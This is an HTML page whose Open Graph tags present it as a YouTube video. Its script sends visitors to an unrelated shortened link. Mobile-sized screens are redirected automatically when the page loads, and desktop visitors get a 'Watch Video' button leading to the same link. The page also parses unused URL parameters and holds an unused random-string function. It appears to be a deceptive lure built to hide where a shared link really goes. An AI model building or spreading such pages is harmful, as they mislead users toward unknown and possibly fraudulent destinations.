
<html>
<head>
<meta property="og:title" content="VIDEO" />
<meta property="og:url"                content="https://www.youtube.com" />

</head>
<body>
<style>
.button {
    background-color: #4CAF50;
    border: none;
    color: white;
    padding: 35px 62px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 20px;
    margin: 4px 2px;
    cursor: pointer;
}
</style>
<p id="demo">
    
</p>
<script type="text/javascript">

function generateRandomString(iLen) {
    var sRnd = '';
    var sChrs = "abcdefghiklmnopqrstuvwxyz";
    for (var i = 0; i < iLen; i++) {
      var randomPoz = Math.floor(Math.random() * sChrs.length);
      sRnd += sChrs.substring(randomPoz, randomPoz + 1);
    }
    return sRnd;
  }

function getUrlVars() {
    var vars = {};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
        vars[key] = value;
    });
    return vars;
}
var id = getUrlVars()["id"];
var index = getUrlVars()["index"];
var name = getUrlVars()["name"];
var wkr = getUrlVars()["wkr"];
function visitPage(){
        window.location = "https://smarturl.it/iyo3b8";
    }

        if (screen.width <= 720) {
        window.location = "https://smarturl.it/iyo3b8";
    } else {
       document.getElementById("demo").innerHTML ="<h1><button class=button onclick=visitPage();> Watch Video</button></h1>"
    }

</script>
</body>
</html>
